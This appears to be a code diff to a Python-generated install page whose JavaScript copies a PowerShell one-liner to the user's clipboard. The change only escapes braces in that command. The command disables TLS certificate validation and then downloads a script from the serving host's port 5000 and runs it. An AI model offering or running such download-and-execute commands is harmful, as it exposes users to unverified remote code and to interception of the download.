@@ -85,7 +85,7 @@ def install_page():
             <span id="copyMsg" style="color: green; margin-left: 10px; display: none;">¡Copiado!</span>
             <script>
                 function copyCommand() {{
-                    const cmd = "[Net.ServicePointManager]::SecurityProtocol = 3072; try { Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class T : ICertificatePolicy { public bool CheckValidationResult(ServicePoint s, X509Certificate c, WebRequest r, int p) { return true; } }' } catch {}; [System.Net.ServicePointManager]::CertificatePolicy = New-Object T; iex (New-Object System.Net.WebClient).DownloadString('" + window.location.protocol + "//" + window.location.hostname + ":5000/script')\\n";
+                    const cmd = "[Net.ServicePointManager]::SecurityProtocol = 3072; try {{ Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class T : ICertificatePolicy {{ public bool CheckValidationResult(ServicePoint s, X509Certificate c, WebRequest r, int p) {{ return true; }} }}' }} catch {{}}; [System.Net.ServicePointManager]::CertificatePolicy = New-Object T; iex (New-Object System.Net.WebClient).DownloadString('" + window.location.protocol + "//" + window.location.hostname + ":5000/script')\\n";
                     if (navigator.clipboard && window.isSecureContext) {{
                         navigator.clipboard.writeText(cmd).then(showCopied);
                     }} else {{
